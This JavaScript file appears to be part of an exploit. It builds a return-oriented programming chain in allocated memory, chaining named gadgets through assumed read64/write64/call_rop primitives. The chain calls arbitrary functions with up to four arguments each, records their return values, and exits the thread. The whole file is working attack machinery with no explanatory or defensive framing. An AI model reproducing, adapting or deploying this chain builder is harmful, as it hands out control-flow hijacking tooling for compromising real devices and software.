const FRAME_STEP = 320;

const FRAME_RESULT = 2048;

const FRAME_SENTINEL = 0xfedcba9876543210n;

function _frameAlignPage(n) {
    return Math.ceil(n / 4096) * 4096;
}

function _frameGetArg(call, k) {
    var a = call.args[k];
    return a === undefined || a === null ? 0n : BigInt(a);
}

function buildFrame(calls) {
    var count = calls.length;
    var tables = 4096;
    var stack = _frameAlignPage(tables + count * 256) + 65536;
    var size = _frameAlignPage(stack + count * FRAME_STEP + 16384);
    var frame = allocPage(size);
    call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));
    var put = function(off, v) {
        write64(frame + BigInt(off), BigInt(v));
    };
    put(16, frame + BigInt(tables));
    put(48, _frameGetArg(calls[0], 0));
    put(88, GADGET_LOAD_TABLE);
    put(104, frame + BigInt(stack));
    for (var i = 0; i < count; i++) {
        var table = tables + i * 256;
        var sp = stack + i * FRAME_STEP;
        put(table, frame + BigInt(table) + 0x10n);
        put(table + 128, calls[i].fn);
        put(FRAME_RESULT + i * 8, FRAME_SENTINEL);
        put(sp + 8, GADGET_CALL4);
        put(sp + 16, _frameGetArg(calls[i], 1));
        put(sp + 32, _frameGetArg(calls[i], 2));
        put(sp + 40, _frameGetArg(calls[i], 3));
        put(sp + 216, GADGET_SAVE_RESULT);
        put(sp + 280, frame + BigInt(FRAME_RESULT + i * 8));
        if (i + 1 < count) {
            put(sp + 264, frame + BigInt(tables + (i + 1) * 256));
            put(sp + 232, _frameGetArg(calls[i + 1], 0));
            put(sp + 296, GADGET_LOAD_TABLE);
        } else {
            put(sp + 296, F_ExitThread);
        }
    }
    return {
        frame: frame,
        size: size,
        count: count
    };
}

function readFrameResult(frame, i) {
    return read64(frame + BigInt(FRAME_RESULT + i * 8));
}
